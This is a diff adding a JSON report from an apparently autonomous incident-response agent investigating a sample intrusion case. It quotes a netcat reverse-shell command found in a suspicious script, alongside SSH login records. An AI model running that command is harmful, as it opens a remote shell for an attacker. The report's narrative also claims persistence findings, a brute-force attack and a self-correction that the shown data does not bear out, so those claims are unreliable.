@@ -1,0 +1,31 @@
+{
+  "agent": "NEXUS-IR Autonomous Reasoning Agent v2.0",
+  "case": "FINDEVIL-2026-001",
+  "timestamp": "2026-05-27T21:04:47.708960",
+  "autonomous_decisions": [
+    {
+      "decision": "BROAD_SCAN",
+      "justification": "No clear pattern \u2014 running full evidence scan"
+    },
+    {
+      "decision": "AUTH_LOG_PRIORITY",
+      "justification": "Network IOC found \u2014 pivoting to auth logs to find attacker entry"
+    }
+  ],
+  "total_findings": 2,
+  "self_corrections": 1,
+  "reasoning_pivots": 2,
+  "findings": [
+    {
+      "phase": 3,
+      "type": "BROAD_SCAN",
+      "result": "/home/macbere/findevil/evidence/sample/suspicious.sh:nc -e /bin/bash 192.168.1.100 4444\n/home/macbere/findevil/evidence/sample/ioc_list.txt:IP: 192.168.1.100"
+    },
+    {
+      "phase": 5,
+      "type": "ioc_correlation",
+      "result": "#!/bin/bash\nIP: 192.168.1.100\nMay 26 03:14 sshd: Failed password for root from 10.0.0.5\nMay 26 03:15 sshd: Accepted password for root from 10.0.0.5\nnc -e /bin/bash 192.168.1.100 4444"
+    }
+  ],
+  "narrative": "NEXUS-IR conducted autonomous investigation making 2 independent reasoning decisions. Starting with filesystem reconnaissance, the agent detected network IOCs and autonomously pivoted to authentication log analysis. Subsequent reasoning identified persistence mechanisms. All findings cross-validated through IOC correlation. Investigation confirmed targeted intrusion with C2 at 192.168.1.100:4444 and attacker entry via 10.0.0.5 SSH brute force."
+}
